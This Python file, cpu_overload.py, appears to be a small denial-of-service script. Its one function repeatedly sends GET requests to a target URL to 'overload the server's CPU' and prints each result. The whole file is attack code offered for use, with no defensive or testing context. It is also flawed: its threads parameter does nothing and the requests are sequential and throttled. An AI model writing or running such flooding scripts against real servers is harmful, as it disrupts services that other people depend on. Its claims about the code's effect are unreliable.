# cpu_overload.py

import requests
import time
from rich.console import Console

console = Console()

# Function to simulate high CPU usage and overload the server's resources
def send_cpu_overload(url, threads, duration):
    console.print(f"[yellow]Overloading server's CPU with intensive requests to {url}...[/yellow]")
    for _ in range(threads * duration):
        try:
            response = requests.get(url, timeout=2)
            if response.status_code == 200:
                console.print(f"[green]Request successful[/green]")
            else:
                console.print(f"[red]Failed with status: {response.status_code}[/red]")
            time.sleep(0.1)  # Adding delay to simulate repeated requests
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Request failed: {e}[/red]")
